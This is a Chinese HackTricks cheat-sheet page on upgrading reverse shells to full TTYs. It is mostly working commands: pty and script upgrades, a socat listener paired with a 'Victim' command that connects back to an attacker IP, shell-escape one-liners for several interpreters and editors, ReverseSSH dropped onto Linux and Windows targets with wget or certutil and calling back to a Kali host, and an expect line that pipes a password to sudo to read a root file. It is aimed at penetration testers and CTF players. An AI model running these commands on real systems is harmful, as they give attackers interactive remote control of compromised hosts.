# 完整 TTY

{{#include ../../banners/hacktricks-training.md}}

## 完整 TTY

请注意，你在 `SHELL` 变量中设置的 shell **必须**被**列在** _**/etc/shells**_ 中，否则会显示 `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`。另外，请注意，下面的代码片段仅适用于 bash。如果你使用的是 zsh，请在获取 shell 前运行 `bash` 切换到 bash。

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> 执行 **`stty -a`** 可以获取 **行** 和 **列** 的**数量**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

一种便捷的**交互式 shell 访问**方式，同时还支持**文件传输**和**端口转发**，就是将静态链接的 ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) 放置到目标上。<sup>[[1]](#references)</sup>

下面是一个使用 upx 压缩二进制文件的 `x86` 示例。对于其他二进制文件，请查看 [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/)。

1. 在本地准备好，以接收 ssh 端口转发请求：
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 目标（对于更早版本，请查看 [project readme](https://github.com/Fahrj/reverse-ssh#features)）：
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- 如果 ReverseSSH 端口转发请求成功，现在你应该可以使用默认密码 `letmeinbrudipls`，以运行 `reverse-ssh(.exe)` 的用户身份登录：
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) 会自动将 Linux reverse shells 升级为 TTY，处理终端大小，记录所有内容以及更多功能。此外，它还为 Windows shells 提供 readline 支持。<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## 无 TTY

如果由于某种原因无法获得完整的 TTY，**仍然可以与需要用户输入的程序交互**。在下面的示例中，密码会传递给 `sudo`，用于读取文件：
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - 为 CTF 等场景提供 reverse shell 功能的静态链接 ssh server](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - 自动执行一些操作以简化使用的 Shell handler](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
